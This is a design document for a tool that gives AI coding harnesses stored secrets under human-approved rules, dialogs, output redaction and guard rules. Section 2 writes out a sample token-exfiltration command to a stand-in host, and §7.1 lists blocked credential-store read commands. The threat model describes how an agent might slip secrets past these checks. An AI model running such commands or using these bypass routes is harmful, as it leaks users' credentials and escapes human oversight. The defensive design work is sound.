# Harness Secrets Sudo Hook: stored secrets for agent harnesses

Status: phase 1 implemented (see §10 for phase 2)
Date: 2026-11-19

## 1. Purpose

Let an AI coding harness run a command that needs a secret (an API token, a database password, a kubeconfig) without the secret entering the model's context, and with the human approving each use.

harness-secrets-sudo-hook already does this for the sudo password. This extends it to any secret the user stores.

## 2. Why this is harder than sudo

With sudo, the program that receives the password is sudo itself, which never prints it. With any other secret, the receiver is a command the model wrote. If harness-secrets-sudo-hook gave `GH_TOKEN` to `sh -c 'echo $GH_TOKEN'` or to `curl https://evil.example -H "Authorization: $GH_TOKEN"`, the secret would be gone.

So hiding the value is not enough. Phase 1 controls **which commands may receive a secret** (rules the user writes) and **when** (a dialog that shows the exact command), and it filters the secret out of the command's output as a last line of defence.

An allowed command can still leak a secret it receives. For example, `git` runs hooks from the repository, and `npm` reads `.npmrc` from the folder. The dialog shows the folder for this reason. Phase 2 (§10) removes this risk for HTTP API tokens.

## 3. Scope

In scope (phase 1):

- Keeping a secret's value in one of three places (§6): for the current harness session only, which is the default; in the project's git-ignored env file; or in the OS credential store (macOS Keychain, or the Linux Secret Service).
- Running a command as the current user with secrets in environment variables or in temporary files.
- The same on a host reached over SSH (the command runs as the SSH user there).
- Per-secret rules: allowed commands, allowed hosts, whether to ask, and how long an approval is remembered.
- Approval dialogs and output redaction.
- Guard rules that stop the model from reading the credential store directly.

Out of scope (phase 1):

- Secrets for a command that also runs as root.
- Blocking the model's file tools from reading `.env` files and other credentials the user keeps outside harness-secrets-sudo-hook.
- A credential-injecting HTTP proxy (phase 2).
- Defending against a hostile program already running as the user. Such a program can read the user's credential store and write to the user's `PATH` directories. harness-secrets-sudo-hook protects against mistakes and prompt-injected requests, not against code with the user's own privileges.

## 4. Security invariants

1. **A secret value never enters model context.** It never appears in `psudo`'s arguments, in the tool call, in `psudo`'s messages, or (best effort, §7.4) in the command's output.
2. **A secret value never appears in a command line.** It reaches the command only as an environment variable or a file. Over SSH it travels on the channel's stdin.
3. **Only allowed commands receive a secret.** A secret with no rule cannot be used. Shells, `env`, `printenv`, `echo`, `printf`, `cat`, wrappers that run another program, multi-call binaries (`busybox`, `coreutils`, `toybox`), `sudo` and `ssh` cannot be allowed at all, on this computer or on an SSH host, by a rule in the file or by a rule harness-secrets-sudo-hook suggests.
4. **The human decides which program may have a secret, and sees the command when they decide.** A rule lets a program have a secret. A rule comes into being only in a dialog that names each secret, the variable it goes into, the host, the folder and the full command: when the user enters the value, or when a stored secret is first used by a program. After that the program gets the secret **without a dialog before each use**; harness-secrets-sudo-hook asks only when it needs something from the user. A rule that says `"confirm": true` asks before each use again. This is a deliberate trade: the rule is then the only gate, so an allowed program gets the secret whenever the agent runs it, with any arguments.
5. **Model-controlled text is data.** Secret names, variable names, hosts and commands go to dialogs and to the remote script as arguments, never as script source.
6. **Failure is closed.** A missing secret, a missing rule, an invalid config, an unavailable store or a failed dialog all mean the command does not run.
7. **Secret files do not outlive the command.** They are created with mode 0600 in a private directory and removed when the command ends.
8. **The agent cannot write its own rules.** The rules file is writable by anything running as the user, the agent included. harness-secrets-sudo-hook applies rules only after the user approves them in a dialog, and it stores the approved rules' hash in the credential store. Any change (a new command, `"confirm": false`, or a different file through `HARNESS_ROOT_HOOK_CONFIG`) asks again.

## 5. Contracts

### 5.1 CLI

```
psudo [-H <host>] (--secret VAR=name | --secret-file VAR=name)... [--] <command> [args...]

psudo --secret-set=<name>      store a value typed into a dialog (single line)
psudo --secret-import=<name>   store a value read from stdin (may be multi-line)
psudo --secret-list            print stored secret names, never values
psudo --secret-delete=<name>   delete a stored secret (asks in a dialog first)
```

- `--secret VAR=name` puts the value of secret `name` into environment variable `VAR`.
- `--secret-file VAR=name` writes the value to a temporary file and puts that file's path in `VAR`, for tools that read credentials from a file (`KUBECONFIG`, `GOOGLE_APPLICATION_CREDENTIALS`).
- With any `--secret` or `--secret-file`, the command runs **as the current user**, not as root. Without them, harness-secrets-sudo-hook behaves exactly as before.
- Secret names match `[a-z0-9][a-z0-9_-]{0,62}`. Variable names match `[A-Za-z_][A-Za-z0-9_]*`. A variable may be used only once per command.
- The caller picks the variable, and the variable decides what the program does with the value. Three rules follow from that:
  1. **The variable is part of the rule** (`vars`, §5.3). A secret goes only into a variable its rule names; without `vars`, only into its own name in upper case (`github-token` is `GITHUB_TOKEN`). A rule harness-secrets-sudo-hook adds names the variables of the request that created it. Otherwise a token allowed for `git` could be requested as `GIT_AUTHOR_NAME` and read back from a commit.
  2. **A value from the project's env file never shares a command with a stored secret** (exit 253, before any dialog). The agent can write that file, so such a value in a variable it picked could tell the allowed program to run something else (`GIT_SSH_COMMAND`, a config file path) and hand the stored secret over. Let the program read the env file itself.
  3. **Some variables can never receive a secret**, because a value there is an instruction, not a credential: `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `TMPDIR`, `IFS`, `ENV`, `SSH_AUTH_SOCK`, `NODE_OPTIONS`, `NODE_PATH`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`, `GOFLAGS`, `MAKEFLAGS`, `EDITOR`, `VISUAL`, `PAGER`, `BROWSER`, `LESSOPEN` and similar, and everything that starts with `LD_`, `DYLD_`, `PSUDO_`, `BASH_`, `PYTHON`, `PERL5`, `GIT_`, `XDG_`, `NPM_CONFIG_` or `npm_config_`. This list cannot be complete, since every tool has variables of its own; rules 1 and 2 are what the design relies on.
- Values may be up to 64 KiB and may not be empty.
- `--secret-set` and `--secret-import` ask in a dialog before replacing an existing secret. `--secret-import` also asks before storing a new one, because its value comes from the caller and not from a dialog: otherwise the agent could store a value of its own under a name the user later trusts. `--secret-delete` always asks.
- The agent normally never calls these: a `--secret` request for a secret that is not stored asks the user for its value (§5.4).

### 5.2 Exit codes

| Code | Meaning |
| --- | --- |
| the command's own | the command ran |
| 2 | usage error |
| 250 | no dialog is available |
| 251 | the user denied the request or the dialog timed out |
| 253 | NOT ALLOWED: the program can never receive secrets, or the secret's rule does not permit this command or host |
| 254 | the credential store is unavailable, or the secret could not be delivered on the host |
| 255 | the SSH connection or login failed |

### 5.3 Rules

Rules live in harness-secrets-sudo-hook's existing config file (`~/.config/harness-root-hook/config.json`), next to `cache`:

```json
{
  "cache": { "enabled": false, "ttl_seconds": 7200 },
  "secrets": {
    "github-token": { "commands": ["gh"], "vars": ["GH_TOKEN"] },
    "prod-db": {
      "commands": ["psql", "pg_dump"],
      "vars": ["PGPASSWORD"],
      "local": false,
      "ssh_hosts": ["prod"],
      "remember_seconds": 1800
    }
  }
}
```

| Field | Default | Meaning |
| --- | --- | --- |
| `commands` | required | Programs that may receive the secret. A bare name matches that program in the system directories harness-secrets-sudo-hook trusts (`/usr/bin`, `/bin`, `/usr/sbin`, `/sbin`, `/usr/local/bin`, `/opt/homebrew/bin`, NixOS paths). An absolute path (`~/` allowed) matches that file only. `~/` is the home directory of your account, not `$HOME`, which the caller sets. |
| `vars` | the secret's own name | Variables the secret may be put in (for `--secret` and for `--secret-file`). Without it, only the name in upper case with `_` for `-`. |
| `local` | `true` | The secret may be used on this computer. |
| `ssh_hosts` | `[]` | SSH host names (as given to `-H`) where the secret may be used. |
| `confirm` | `false` | `true` asks in a dialog before each use (Deny / Allow once). By default an allowed command gets the secret without a dialog. |
| `remember_seconds` | `0` | When above 0, the dialog offers "Allow for N min". That approval covers exactly the same secrets, variables, host, folder and command until it expires. Maximum 86400. |

Unknown fields and wrong types make the config invalid, and then every secret request fails closed, as the cache does today. The rules are shown to the user for approval, so every command and host in them must be plain text on one line: no control characters, no invisible or direction-changing characters, at most 1024 bytes per command and 64 entries per list. Anything else is also an invalid config.

**Each SSH host has its own secrets.** Several hosts may name a secret the same way and hold different values under that name: `ollama-api-key` on `maxwell-bob` is not the one on `android-dev`. psudo knows which host a request is for from its `-H` argument, and it uses that argument as given: `android-dev`, `root@android-dev` and `192.168.8.20` are three hosts to psudo, even when they reach the same machine. With `-H host`, the secret called `name` is:

1. `name@host`, the host's own secret, when the config has a rule under that key;
2. otherwise `name`, when its rule lists the host in `ssh_hosts` (one value shared on purpose);
3. otherwise `name@host` when `name` has a rule: that rule is for other hosts, so this host gets a secret of its own. psudo asks the user for its value in the Secret needed dialog and adds a rule for it, instead of refusing the request;
4. with no rule at all, `name` when a value is already kept under that plain name, for example one stored with `--secret-set` (the dialog offers to add a rule for it, as before), and `name@host` otherwise.

A rule for a host's own secret takes its host from its key, so it has no `local` or `ssh_hosts` field:

```json
"ollama-api-key": { "commands": ["/home/bob/.local/bin/hermes-env-store"], "local": false, "ssh_hosts": ["maxwell-bob"] },
"ollama-api-key@android-dev": { "commands": ["/home/dev/.local/bin/hermes-env-store"], "vars": ["OLLAMA_API_KEY"] }
```

A host's own secret goes into the same variables as the plain name (`OLLAMA_API_KEY` by default), and psudo reads it from the project's env file under that variable too. psudo never saves one in the env file, though: the file has one variable for every host, so the value would reach the other hosts as well. `--secret-list`, `--secret-set=name@host` and `--secret-delete=name@host` show and take the key.

Locally, harness-secrets-sudo-hook resolves a bare command name only through the trusted directories, never through the caller's `PATH`, and runs that resolved file. A relative path (`./gh`) is refused. On an SSH host, harness-secrets-sudo-hook cannot inspect the host's files: a bare name runs through the remote `PATH`, and an absolute path must match an absolute entry.

### 5.4 Execution

Local:

1. Parse and validate the arguments and load the rules. A secret with no rule gets the narrowest suggested rule: only `argv[0]` as given, only this host, `confirm` on. Check the request against the rules plus the suggestions; on failure (for example a shell as the command), exit 253 before any dialog. Look for each value (§6): in this session, then in the OS credential store (without decrypting it on macOS), then in the project's env file.
2. If the file has rules and they differ from the approved ones (by SHA-256), show the rules dialog (§5.5). Deny means exit 251. A file with no rules has nothing to approve and shows no dialog. No rule means no program may have a stored secret, so one has to be allowed in step 3, in a dialog that shows the command.
3. For each secret that is in none of the places, show the **Secret needed** dialog. It is a hidden-input field with the whole request and, if a rule is being added, a note saying so. Then show **Keep the secret?** (§5.5), which asks where the value is kept; its default is this session only. For each stored secret with no rule, show **Allow and add rule**. Cancel in the first or the last of these means exit 251, and nothing is kept or added. On success, keep the value where the user chose, write the new rules to the config file (keeping its order and formatting), and record the new rules' hash as approved. These dialogs show the whole request, so they also approve this run.
4. Otherwise run the command without a dialog. Only when a rule of one of the secrets says `"confirm": true` is the user asked first (unless a remembered approval matches).

A value that comes from the project's env file needs no rule and no dialog, and harness-secrets-sudo-hook writes no rule for it: the agent can read that file, so a rule would protect nothing. It must not leave a rule behind either, because a rule added without a dialog, for a name the agent put in that file, would later cover a real value the user stores under the same name. For the same reason step 2 is skipped when every secret of the request comes from the env file. A rule that is already in the config file for such a name still applies, as a restriction.

The user never has to run `psudo` or edit its config: the agent starts every step, and the user only answers dialogs. `--secret-set` and `--secret-import` remain for values the user wants to enter ahead of time, and for multi-line values the single-line dialog cannot take.
4. Read the values from the places that have them.
5. Start the command with a fixed environment: `HOME`, `USER` and `LOGNAME` from the account database (never the caller's values); `TERM`, `LANG`, `LC_*`, `TZ`, `TMPDIR`, `SSH_AUTH_SOCK` and `DBUS_SESSION_BUS_ADDRESS` from the caller; `XDG_RUNTIME_DIR` only when it is the standard `/run/user/<uid>`; and `PATH` set to the trusted directories, plus the secret variables. Nothing else from the caller's environment passes, so the caller cannot add `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `LD_PRELOAD` and similar variables that the dialog does not show. For the same reason the caller's `HOME` and the other `XDG_*` directories do not pass: with `HOME` or `XDG_CONFIG_HOME` pointing at a folder of its own, the caller could give `git` or `gh` a config file that runs a program with the secret. Programs use their default locations under the real home directory.
6. Pass the caller's stdin to the command, and send its stdout and stderr through the redactor.
7. Remove secret files when the command exits, and forward SIGINT, SIGTERM and SIGHUP to it.

SSH (`-H host`):

1. Steps 1–4 as above, then connect with the same logic as the sudo path: a kept connection, key authentication, or an SSH login dialog.
2. Run a fixed script on the host. Variable names and kinds are its arguments. The script first reports `<marker> ready`, with a random marker. Only then does harness-secrets-sudo-hook send the values, base64-encoded, one per line, on stdin. So a host that is not running the script (a forced command, a login shell that is not a POSIX shell, a startup file that reads stdin) receives nothing. The script decodes each value, exports it or writes it to a 0600 file in a private `mktemp -d` directory, reports `<marker> ok`, closes stdin, and runs the command. An `EXIT` trap removes the directory.
3. If `ready` does not arrive within 30 seconds, nothing was sent and harness-secrets-sudo-hook exits 254. If `ok` does not arrive (for example `base64` is missing on the host), the command did not run and harness-secrets-sudo-hook exits 254.

### 5.5 Dialog

harness-secrets-sudo-hook shows a dialog only when it needs something from the user:

| Dialog | When |
| --- | --- |
| `Secret needed`, then `Keep the secret?` | harness-secrets-sudo-hook has no value for the secret |
| `Secret request` with `Allow and add rule` | a stored secret is used by a program for the first time (no rule yet) |
| `Secret rules changed` | the rules file was changed outside these dialogs |
| `Secret request` with `Allow once` | only for a rule that says `"confirm": true` |

A value harness-secrets-sudo-hook has, used by a program its rule lists, runs with no dialog. A program the rule does not list is refused with exit 253, also with no dialog.

The request dialog has the title `Secret request (Claude Code)` or `(Codex)`. Body:

```
Use secrets:
  github-token  as GH_TOKEN
  k8s-staging   as a file in KUBECONFIG

Host: this computer
Folder: /Users/me/project
Command:
kubectl get pods

Only this command receives the values, but it can send them anywhere it chooses.
```

Buttons: `Deny` (the default button: Return presses it, and a timeout denies too), `Allow once`, and `Allow for N min` when `remember_seconds` is above 0. The body ends with a line that says what they do: `Allow once runs this command one time; psudo asks again for the next one. Deny runs nothing.` On macOS the first button is named as the default button only, not also as the cancel button: with both, macOS gives it the Escape key and Return does nothing, so the user has to click. On Linux, zenity and kdialog are supported. zenity gets `--default-cancel`, so Return denies there too. kdialog has no option to choose the default button, so with kdialog Return may press an approval; zenity is tried first for this reason. `ssh-askpass` cannot show buttons, so it counts as no dialog (exit 250).

Text the caller controls cannot rearrange the dialog. The folder is shown on one line, with newlines and tabs as `\n` and `\t`. In the folder and the command, control characters and invisible or direction-changing characters appear as `\u{…}` escapes. The command comes last, so whatever its arguments contain, the lines above it are harness-secrets-sudo-hook's own.

Each secret line ends with the place its value comes from, such as `github-token  as GH_TOKEN  (from this session)`, `(from the Keychain)` or `(from .env.local)`. A value from an env file is one the agent could have written, so the user should see that.

For a secret that is in none of the places, the dialog is titled `Secret needed`. It has a hidden-input field for the value, above the same body, and a line such as `This also adds a rule to config.json: ./charge-report may use "stripe-api-key" on this computer. From then on psudo gives it the secret without asking again; any other program is refused.` Its timeout is 270 seconds, to leave time to find the value.

After the value is entered, a dialog titled `Keep the secret?` asks where to keep it. Each button has one line of explanation in the body:

| Button | Shown when | Meaning |
| --- | --- | --- |
| `This session only` | harness-secrets-sudo-hook can tell which session it runs in | Kept until this harness session ends. This is the first button, so Return, a closed dialog and a timeout all choose it. |
| `Only this command` | it cannot (no session id, or the harness is not an ancestor process) | Used for this command, then forgotten. Takes the place of the button above. |
| `Save in .env.local` (or `.env`) | the project has an env file that git ignores, and the name makes a variable | Written to that file as plain text (§6). |
| `Save in Keychain` (or `keyring`) | always | Stored in the OS credential store for every project. |

When the rules are new or changed, a dialog titled `Secret rules changed` lists every secret with its commands, hosts and asking behaviour (`these programs get it without a dialog`, `asks before each use`, `asks before each use, can remember for N min`). Its buttons are `Deny` and `Approve rules`. This dialog stays even though it does not ask for a value: the agent can edit the rules file, and without it could give any stored secret to a program of its own.

### 5.6 The program stays the one the user allowed

A rule names a program, and harness-secrets-sudo-hook does not ask before each use. That is only worth something while the program is the file the user allowed. Often the agent can change it: a script in the project, a tool under `~/bin`, anything Homebrew installed (those folders belong to the user).

- **Pin.** For every local program, harness-secrets-sudo-hook remembers the SHA-256 of the file the first time a stored secret is given to it. The pins are kept in the credential store, next to the approved rules. When the file is a different one later (edited, replaced, a link pointed elsewhere, or another file of that name found earlier in the trusted directories), a dialog titled `Program changed` shows the path and the request, with `Deny` (default) and `Allow this version`. A pin belongs to the entry of the rule's `commands` that allowed the program, not to the path it resolved to. Programs only root can change are pinned too: a rule's entry can be a link in a folder of the user, and a link pointed at a root-owned program would otherwise go unchecked. The price is one dialog when a system update changes a pinned program.
- **What starts is what was checked.** harness-secrets-sudo-hook compares the file's identity (device, inode, size, modification time and change time) before and after reading it and once more right before the start, and refuses with exit 253 when anything differs. A swap or an edit would have to fall into the instant between that last look and the start, and every attempt that misses shows up as a refusal or as a `Program changed` dialog.
- **Limits.** The first use is trusted as it is; the pin catches changes after it. Only the program file is pinned, not what it loads: libraries, modules, config files, or the scripts an interpreter is given. On an SSH host harness-secrets-sudo-hook cannot inspect files, so nothing is pinned there.
- **Interpreters.** `python3`, `node`, `perl`, `ruby`, `awk` and similar run whatever code they are given, so naming one in a rule says nothing about what happens to the secret. A rule harness-secrets-sudo-hook suggests for an interpreter has `"confirm": true`: it asks before each use and shows the whole command. An interpreter is recognised by the file that will run, not only by the name it is called by: a link with another name, or a hard link to an interpreter in the trusted directories, counts. A copy of an interpreter under another name is not recognised. A rule the user writes may leave that out; then the secret is in effect the agent's.
- **Forbidden programs under another name.** The check ignores case (`/bin/SH` is `/bin/sh` on a file system that ignores case) and also refuses a file that is the same file as a forbidden program (a hard link).

## 6. Storage

### 6.1 Where a value is kept

A value the user enters is kept **for the session only**, unless the user chooses one of the two lasting places. harness-secrets-sudo-hook looks for a value in this order:

| Order | Place | Lifetime | Who can read it |
| --- | --- | --- | --- |
| 1 | This session | Until the harness session ends | harness-secrets-sudo-hook, for commands started from that session |
| 2 | OS credential store | Until the user deletes it; every project | harness-secrets-sudo-hook |
| 3 | Project env file | As long as the line is in the file; this project | Anything that can read the project, the agent included |

The env file comes last on purpose. The agent can write it, so a line it adds there must not replace a value the user stored. The dialog also names the place each value comes from (§5.5).

**Session.** The harness gives its tool commands a session id (`CLAUDE_CODE_SESSION_ID` in Claude Code, `CODEX_THREAD_ID` in Codex). That variable is the caller's to set, so it is not what protects a session's secrets. The harness process is. harness-secrets-sudo-hook walks its own ancestors, takes the nearest one that is the harness program (`claude`, `codex`), and files a session's values in the credential store under that process id and a hash of the session id: `harness-root-hook.session.<pid>-<hash>-<name>`. A caller that claims another session's id is not a descendant of that session's harness, so it finds nothing. In Claude Code, `CLAUDE_PID` is used only when no ancestor is called `claude` (an install that runs under `node`), and only when it really is an ancestor.

A session's values are removed:

- when the session ends, by the Claude Code `SessionEnd` hook (`psudo --hook=claude-code-session-end`); `/clear` and switching sessions end a session too;
- when the harness process is gone without having said so (it crashed or was killed): on macOS by the cleanup task within five minutes, elsewhere when the next session starts. Until then such a value cannot be used, because no process descends from a harness that no longer exists.

Codex gets no `SessionEnd` hook from the installer, so there the second point applies when Codex exits.

**Project env file.** harness-secrets-sudo-hook uses `.env.local` or `.env` in the folder of the command, or at the top of the git work tree, and only a file that **git ignores** (`git check-ignore`, which is never true for a tracked file). A file that would be committed is neither read nor written. A symbolic link is not followed. The variable is the secret's name in upper case with `_` for `-`: `stripe-api-key` is `STRIPE_API_KEY`. An empty assignment (`STRIPE_API_KEY=`) is a placeholder, not a value. To save a value, harness-secrets-sudo-hook adds one line at the end of the file (the programs that load these files use the last assignment) and changes nothing else; a new file gets mode 0600. It asks git again right before writing, and writes only while the file is still ignored. git runs with a fixed environment, so `GIT_DIR` or a config file set by the caller cannot change its answer.

An env file is plain text. harness-secrets-sudo-hook still delivers and redacts its values like any other, but invariant 1 does not hold for them: the agent can read the file. It is for projects that already keep their secrets this way. For a value the agent must not be able to read, choose the session or the credential store.

### 6.2 Credential-store entries

| | macOS Keychain | Linux Secret Service |
| --- | --- | --- |
| Secret | generic password, service `harness-root-hook.secret.<name>`; a host's own secret is `<name>@<host in hex>`, because a host can contain dots and quotes | attributes `application=harness-root-hook kind=secret name=<name> account=<user>` |
| Session secret | service `harness-root-hook.session.<pid>-<hash>-<name>` | `kind=session name=<pid>-<hash>-<name>` |
| Approvals | service `harness-root-hook.approvals.<harness>` | `kind=approvals name=<harness>` |
| Approved rules hash | service `harness-root-hook.approvals.rules` | `kind=approvals name=rules` |
| Value encoding | base64, written through `security -i` stdin, split into 3000-character parts (`…<name>.partN`) to fit its 4096-byte line limit | base64 on `secret-tool store` stdin |

The approvals entry is a JSON map from a SHA-256 of the request (harness, host, folder, secrets and variables, command) to an expiry time. It holds no secret values. It lives in the credential store rather than a file, so changing it needs the same `security`/`secret-tool` access the guard blocks.

## 7. Enforcement

### 7.1 Guard

The PreToolUse guard keeps its sudo rules. The credential-store rule changes from "reads of `harness-root-hook` entries" to any of these, because a broad query could otherwise reach harness-secrets-sudo-hook's secrets:

- `security find-generic-password` or `find-internet-password` with `-w` or `-g` (prints a secret);
- `security dump-keychain -d`;
- `secret-tool lookup` or `secret-tool search`;
- `security -i`, which reads its commands from stdin, where the guard cannot see them;
- any `security` or `secret-tool` command that names `harness-root-hook` (as before).

These apply wherever the read would run: behind a wrapper and its values (`timeout 5 security …`, `find . -exec security … \;`), inside code given to a shell, and as the command given to `psudo` itself (`psudo security find-generic-password -w …`), which harness-secrets-sudo-hook would otherwise run for the model.

`psudo --secret…` commands are the installed `psudo` and are allowed. harness-secrets-sudo-hook applies its own rules.

Codex has no deny hook in harness-secrets-sudo-hook's integration, so on Codex these reads are not blocked. Only the session context and the sandbox stand in the way.

### 7.2 Session context

The SessionStart context tells the model: use `psudo --secret VAR=name -- <command>` for a stored secret, `psudo --secret-list` to see names, never ask for a secret in chat, and stop on 251 or 253 rather than finding another way. It also says to name a secret after the project's environment variable (`STRIPE_API_KEY` is `stripe-api-key`), so that harness-secrets-sudo-hook finds the value in the project's env file, that a new value is kept for the session only unless the user saves it, and never to read a secret from an env file itself.

### 7.3 What the rules do not stop

- An allowed program that runs code it finds in the folder or in its own config: git hooks and `core.sshCommand`, `.npmrc`, Makefiles, `psql`'s `\!`. The dialog in which the rule is made shows the folder and the command, but harness-secrets-sudo-hook does not ask before each later use. Set `"confirm": true` in the rule for these tools.
- Interpreters the user allows with `"confirm": false` (`python3`, `node`). They can print their environment. harness-secrets-sudo-hook's own rules for them ask before each use (§5.6).
- What an allowed program loads besides its own file: modules, plugins, config. The pin in §5.6 covers the program file only.

### 7.4 Redaction

harness-secrets-sudo-hook replaces each secret in the command's stdout and stderr with `[REDACTED:<name>]`. It matches the raw value, its standard and URL-safe base64 forms, and its URL-encoded forms. For file secrets it also matches every line of 12 or more characters. It holds back only output that could be the start of a match, so normal output is not delayed. Redaction is best effort: it cannot catch a value that has been transformed in other ways (such as base64 of `user:token`, hashing, or splitting).

## 8. Failure behaviour

| Situation | Result |
| --- | --- |
| No value in the session, the credential store or the project's env file | the Secret needed dialog asks for it; Cancel is 251. The value is kept for the session unless the user chooses to save it |
| The chosen place cannot take the value (the store fails, or git no longer ignores the env file) | 254, the command did not run |
| No rule for the secret | the dialog offers to add the narrowest rule; Deny is 251 |
| Command or host not allowed by an existing rule, or a forbidden program | 253, naming the field the user would have to change |
| A rule for the name exists, but for other SSH hosts | the host gets its own secret `name@host`: the Secret needed dialog asks for its value |
| Config invalid | 253, `invalid secrets rules in config.json` |
| Rules changed and the user denies them | 251 |
| User clicks Deny, or the dialog times out | 251 |
| The program file changed since the user allowed it | the Program changed dialog; Deny is 251 |
| Keychain locked or Secret Service missing | 254 |
| The host does not start harness-secrets-sudo-hook's script (forced command, non-POSIX login shell) | 254, no secret was sent |
| Remote decoding fails | 254, the command did not run |
| SSH fails | 255 |

## 9. Acceptance criteria

- The value never appears in `psudo`'s stdout or stderr, in argv, or in the caller's environment; the tests use a value with quotes, spaces and shell metacharacters.
- Every exit code above is produced by a test.
- A request is refused before any dialog when the secret, rule, command or host does not match.
- The child receives exactly the fixed environment and the secret variables.
- Secret files are 0600 and removed after the command, locally and remotely.
- Redaction works across write boundaries and for each encoding listed.
- Remembered approvals match only an identical request and expire.
- A secret that is not stored is asked for in a hidden-input dialog that shows the whole request; a secret with no rule gets only the narrowest rule, written to the config file without reshuffling it, and only after the user answers.
- Changed rules, including one that drops `"confirm": true`, are not used until the user approves them.
- A value harness-secrets-sudo-hook has, used by a program its rule lists, runs with no dialog; a program the rule does not list is refused with no dialog.
- A value from the project's env file runs with no dialog and leaves no rule behind; a value stored later under the same name still needs its program allowed in a dialog.
- End to end, headless Claude Code and Codex, told nothing about `psudo`, use `--secret` for a task that needs a stored secret. Asked to print a secret, or to send it with a command the rules don't allow, they get no value, and the transcripts never contain it.
- A value entered in the dialog is kept for the session by default: the same session finds it, another session (another id, or the same id under another harness process) is asked again, and nothing is written to the credential store or to a file unless the user chooses that.
- The session's values are removed when the session ends, and those of a harness process that no longer exists are removed too; a live session's values are not touched.
- A process id or session id set by the caller cannot move a session to another process.
- Only an env file that git ignores is read or written; a tracked file, an unignored file and a symbolic link are not. A value in an env file never replaces one in the credential store.
- Without a session harness-secrets-sudo-hook can identify, the default keeps the value for one command only.
- With `HOME` set by the caller, harness-secrets-sudo-hook still reads and writes the user's own keychain, and no system dialog about a missing keychain appears.
- A program whose file changed after the user allowed it is asked about again, and refusing runs nothing; so is another file of the same name found first. An unchanged program is not asked about.
- A rule harness-secrets-sudo-hook suggests for an interpreter asks before each use, also when the interpreter is reached through a link with another name.
- A link in the rule that is pointed at a root-owned program is a changed program. A file edited or replaced between the check and the start is not started.
- `/bin/SH`, and a hard link to a forbidden program under another name, are refused.
- A secret is refused in a variable its rule does not name; a rule harness-secrets-sudo-hook adds names the variable of the request.
- A value from the env file together with a stored secret, or with one about to be entered, is refused before any dialog.
- A forbidden program is refused on an SSH host as well, including through a suggested rule.
- `HOME` and `XDG_CONFIG_HOME` set by the caller reach neither the command nor the meaning of `~/` in a rule.
- A host that echoes its stdin instead of running the script receives no secret.
- A folder name with newlines cannot add a second `Command:` line to the dialog, and a rule with control characters is an invalid config.
- Removing a rule from the file does not open the secret, and starts no dialog about the rules: the program has to be allowed in a dialog that shows the command, and refusing there runs nothing.
- Guard: the reads in §7.1 are denied; `security find-generic-password -s x` without `-w`/`-g` and `psudo --secret…` are allowed.

## 10. Phase 2: credential-injecting proxy

For HTTP API tokens, harness-secrets-sudo-hook would start a short-lived local proxy and give the command a placeholder token and `HTTPS_PROXY`. The proxy replaces the placeholder with the real token only on requests to the hosts the rule allows. A command that sends the placeholder anywhere else sends nothing useful, so this closes the gaps in §7.3 for those tokens. It needs a local CA certificate for TLS, trusted only by the child process.
